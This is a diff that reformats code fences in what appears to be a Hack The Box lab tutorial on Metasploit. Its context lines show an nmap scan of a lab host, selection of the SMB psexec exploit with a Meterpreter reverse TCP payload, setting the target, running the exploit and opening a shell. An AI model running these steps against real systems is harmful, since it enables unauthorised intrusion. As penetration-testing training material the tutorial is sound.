@@ -16,8 +16,7 @@ Let's start working hands-on with Metasploit by launching the Metasploit framewo
 
 #### Starting MSF
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo msfconsole 
                                                   
 IIIIII    dTb.dTb        _.---._
@@ -51,8 +50,7 @@ In this case, we will be using enumeration results from a `nmap` scan to pick a 
 
 #### NMAP Scan
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ nmap -sC -sV -Pn 10.129.164.25
 
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
@@ -85,8 +83,7 @@ Once we have this information, we can use Metasploit's search functionality to d
 
 #### Searching Within Metasploit
 
-```
-        shellsession
+```shellsession
 msf6 > search smb
 
 Matching Modules
@@ -136,8 +133,7 @@ Once we select the module, we will notice a change in the prompt that gives us t
 
 #### Option Selection
 
-```
-        shellsession
+```shellsession
 msf6 > use 56
 
 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
@@ -149,8 +145,7 @@ Notice how `exploit` is outside of the parentheses. This can be interpreted as t
 
 #### Examining an Exploit's Options
 
-```
-        shellsession
+```shellsession
 msf6 exploit(windows/smb/psexec) > options
 
 Module options (exploit/windows/smb/psexec):
@@ -189,8 +184,7 @@ We will want to use the `set` command to configure the following settings as suc
 
 #### Setting Options
 
-```
-        shellsession
+```shellsession
 
 msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71
 RHOSTS => 10.129.180.71
@@ -210,8 +204,7 @@ These settings will be specific to the IP address on your attack box and on the 
 
 #### Exploits Away
 
-```
-        shellsession
+```shellsession
 
 msf6 exploit(windows/smb/psexec) > exploit
 
@@ -235,8 +228,7 @@ Like other command language interpreters (Bash, PowerShell, ksh, etc...), Meterp
 
 #### Interactive Shell
 
-```
-        shellsession
+```shellsession
 meterpreter > shell
 Process 604 created.
 Channel 1 created.
